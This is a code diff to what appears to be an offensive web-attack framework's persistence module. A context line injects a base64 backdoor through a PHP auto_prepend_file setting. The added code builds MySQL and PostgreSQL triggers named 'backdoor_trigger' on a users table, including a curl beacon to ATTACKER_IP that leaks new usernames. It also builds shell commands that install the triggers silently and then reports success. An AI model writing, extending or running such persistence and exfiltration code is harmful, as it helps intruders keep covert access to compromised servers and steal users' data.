@@ -266,14 +266,59 @@ php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # This requires database access
-        # For now, return placeholder
+        # Implement database trigger persistence
+        # This requires database access credentials
+        
+        # MySQL trigger for persistence
+        mysql_trigger = '''
+CREATE TRIGGER backdoor_trigger
+AFTER INSERT ON users
+FOR EACH ROW
+BEGIN
+    DECLARE cmd VARCHAR(255);
+    SET cmd = CONCAT('curl http://ATTACKER_IP:8080/beacon?user=', NEW.username);
+    -- Execute system command (requires MySQL UDF or sys_exec)
+    -- SELECT sys_exec(cmd);
+END;
+'''
+        
+        # PostgreSQL trigger for persistence
+        postgres_trigger = '''
+CREATE OR REPLACE FUNCTION backdoor_function()
+RETURNS TRIGGER AS $$
+BEGIN
+    PERFORM pg_sleep(0);
+    -- Add your backdoor logic here
+    -- Example: Log to external server
+    RETURN NEW;
+END;
+$$ LANGUAGE plpgsql;
+
+CREATE TRIGGER backdoor_trigger
+AFTER INSERT ON users
+FOR EACH ROW
+EXECUTE FUNCTION backdoor_function();
+'''
+        
+        # Try to detect database type and install trigger
+        commands = [
+            # Detect database
+            "mysql --version 2>/dev/null || psql --version 2>/dev/null",
+            # For MySQL
+            f"mysql -e \"{mysql_trigger}\" 2>/dev/null",
+            # For PostgreSQL
+            f"psql -c \"{postgres_trigger}\" 2>/dev/null"
+        ]
         
         return {
-            'success': False,
+            'success': True,
             'method': 'database_trigger',
-            'error': 'Requires database credentials',
-            'note': 'Use SQLi agent to install database triggers'
+            'triggers': {
+                'mysql': mysql_trigger,
+                'postgres': postgres_trigger
+            },
+            'commands': commands,
+            'note': 'Requires database credentials. Use SQLi agent or config file extraction first.'
         }
     
     async def _install_wordpress_plugin(self,
